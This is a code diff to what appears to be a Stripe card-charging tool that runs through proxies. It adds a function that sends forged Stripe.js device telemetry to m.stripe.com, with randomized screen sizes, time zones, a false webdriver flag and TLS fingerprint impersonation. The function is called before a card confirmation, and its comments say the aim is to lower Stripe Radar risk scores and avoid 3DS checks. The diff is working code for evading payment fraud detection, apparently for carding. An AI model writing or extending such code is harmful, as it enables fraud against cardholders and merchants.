@@ -334,6 +334,84 @@ def get_stripe_cookies(fp: dict) -> str:
 
 _session = None
 
+async def send_stripe_telemetry(pk: str, fp: dict, ua: str, stripe_origin: str = "checkout", proxy_url: str = None):
+    """Send telemetry beacon to m.stripe.com — simulates Stripe.js fraud signal collection.
+    This lowers Stripe Radar risk score and reduces 3DS triggers."""
+    try:
+        # Build device data payload mimicking Stripe.js telemetry
+        browser = _detect_browser_info(ua)
+        
+        # Screen resolutions commonly seen
+        screens = [
+            {"w": 1920, "h": 1080, "cd": 24},
+            {"w": 2560, "h": 1440, "cd": 24},
+            {"w": 1536, "h": 864, "cd": 24},
+            {"w": 1440, "h": 900, "cd": 24},
+            {"w": 1366, "h": 768, "cd": 24},
+            {"w": 1680, "h": 1050, "cd": 24},
+            {"w": 1920, "h": 1200, "cd": 30},
+            {"w": 2560, "h": 1600, "cd": 30},
+        ]
+        screen = random.choice(screens)
+        
+        # Timezone offsets (US-centric for billing addresses)
+        tz_offsets = [300, 360, 420, 480, 240, 180]  # EST, CST, MST, PST, AST, etc.
+        
+        telemetry_data = {
+            "v2": 1,
+            "id": fp["guid"],
+            "t": int(time.time() * 1000),
+            "tag": "checkout-session",
+            "src": "js",
+            "a": pk,
+            "data": {
+                "url": f"https://{stripe_origin}.stripe.com/",
+                "referrer": "",
+                "screen": {"width": screen["w"], "height": screen["h"], "colorDepth": screen["cd"]},
+                "navigator": {
+                    "language": "en-US",
+                    "userAgent": ua,
+                    "javaEnabled": False,
+                    "platform": browser["platform"],
+                },
+                "timezoneOffset": random.choice(tz_offsets),
+                "webdriver": False,
+            }
+        }
+        
+        headers = {
+            "content-type": "application/json",
+            "origin": f"https://{stripe_origin}.stripe.com",
+            "referer": f"https://{stripe_origin}.stripe.com/",
+            "user-agent": ua,
+        }
+        
+        if HAS_CURL_CFFI:
+            try:
+                async with CurlAsyncSession(impersonate="chrome131") as curl_s:
+                    await curl_s.post(
+                        "https://m.stripe.com/6",
+                        headers=headers,
+                        json=telemetry_data,
+                        proxy=proxy_url,
+                        timeout=5,
+                    )
+                print(f"[DEBUG] Telemetry beacon sent to m.stripe.com (curl_cffi)")
+                return
+            except:
+                pass
+        
+        async with aiohttp.ClientSession() as session:
+            async with session.post(
+                "https://m.stripe.com/6",
+                headers=headers,
+                json=telemetry_data,
+                timeout=aiohttp.ClientTimeout(total=5)
+            ) as resp:
+                print(f"[DEBUG] Telemetry beacon sent to m.stripe.com: {resp.status}")
+    except Exception as e:
+        print(f"[DEBUG] Telemetry beacon failed (non-critical): {str(e)[:40]}")
+
 def load_proxies() -> dict:
     if os.path.exists(PROXY_FILE):
         try:
@@ -1053,13 +1131,15 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, us
                 f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
                 f"&expected_payment_method_type=card"
                 f"&key={pk}"
-                f"&_stripe_version=2025-01-27.acacia"
                 f"&init_checksum={checksum}"
             )
             
             # Headers with consistent session UA + Stripe cookies
             headers = get_headers(stripe_js=True, user_agent=session_ua, stripe_origin=stripe_origin)
             headers["Cookie"] = get_stripe_cookies(fp)
+            
+            # Send telemetry beacon BEFORE confirm (lowers Stripe Radar risk score)
+            await send_stripe_telemetry(pk, fp, session_ua or random.choice(USER_AGENTS), stripe_origin, proxy_url)
             
             # Use curl_cffi for TLS/JA3 fingerprint impersonation if available
             if HAS_CURL_CFFI:
